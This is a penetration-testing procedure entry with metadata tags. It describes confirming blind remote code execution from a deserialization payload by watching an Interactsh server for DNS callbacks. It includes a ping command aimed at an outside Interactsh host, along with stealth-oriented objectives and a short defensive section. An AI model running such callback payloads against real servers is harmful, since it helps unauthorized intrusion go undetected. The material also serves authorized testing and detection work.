---
id: 25a2784a-47cb-462d-89a6-296c899cd8e9
name: Observe-RCE-Confirmation-via-Interactsh
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:42.124Z'
tactics:
  - '[[Collection]]'
techniques:
  - '[[Exfiltration Over Alternative Protocol]]'
tags:
  - rce
  - oob
commands:
  - '[[commands/ping-interactsh]]'
platforms:
  - Web
tools:
  - '[[tools/interactsh]]'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exfiltration Over Alternative Protocol]]'
---

# Observe-RCE-Confirmation-via-Interactsh

## Summary

This procedure monitors an Interactsh instance for DNS interactions confirming the execution of the RCE payload on the target server.

## Description

After form submission, the deserialization executes the ping command, generating a DNS query to the Interactsh domain. This OOB technique verifies blind RCE without direct server output.

## Requirements

1. Running Interactsh server with a unique subdomain
2. Network access to receive DNS queries
3. Payload embedded with Interactsh domain

## Defense

Defensive measures and detection strategies:

- Block or log outbound DNS to suspicious domains
- Use DNS firewalls to prevent exfiltration
- Monitor for unexpected ICMP/DNS from app servers

## Objectives

1. Capture evidence of command execution
2. Validate RCE without alerting
3. Document interaction for reporting

## Instructions

### Step 1: Monitor Interactsh Logs

**Context**: Watch for incoming interactions triggered by the ping.

**Instructions**: Run Interactsh client and tail the logs for DNS events from the target IP.

> Expected: Log entry showing DNS A/AAAA query to the subdomain, timestamped post-submission.

### Step 2: Verify Payload Command

**Context**: Confirm the interaction matches the embedded command.

**Command** ([[commands/ping-interactsh]]):
```bash
ping aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.interactsh.com
```

> This is the executed command; success is observing the DNS request in Interactsh, indicating server-side run.
